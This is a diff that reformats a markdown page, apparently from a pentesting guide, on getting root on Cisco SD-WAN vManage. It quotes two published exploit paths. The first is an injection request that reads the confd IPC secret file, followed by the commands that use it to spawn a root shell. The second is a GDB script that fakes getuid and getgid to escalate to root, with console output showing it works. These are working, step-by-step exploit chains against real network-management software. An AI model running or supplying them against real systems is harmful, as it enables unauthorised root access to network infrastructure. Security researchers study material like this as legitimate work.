@@ -2,11 +2,11 @@
 
 ## Path 1
 
-\(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)\)
+(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries \(accessible with an account on the Cisco website\), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
+After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
 
-```text
+```
 
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret 
 
@@ -15,7 +15,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
 
-```text
+```
 
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -30,7 +30,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
 
-```text
+```
 
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -51,13 +51,13 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## Path 2
 
-\(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)\)
+(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
 The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
 
 When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
 
-```text
+```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -86,26 +86,26 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 ```
 
-When I run “ps aux”, I observed the following \(_note -g 100 -u 107_\)
+When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
 
-```text
+```
 vmanage:~$ ps aux 
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
 
-I hypothesized the “confd\_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor \(-i 1015\) was created somewhere along the way and I cannot fake it.
+My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
 
-As mentioned in synacktiv’s blog\(last example\), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
+As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
 
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+I created a GDB script where I forced the API `getuid `and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
 
 root.gdb:
 
-```text
+```
 set environment USER=root
 define root
    finish
@@ -125,7 +125,7 @@ run
 
 Console Output:
 
-```text
+```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -158,4 +158,3 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
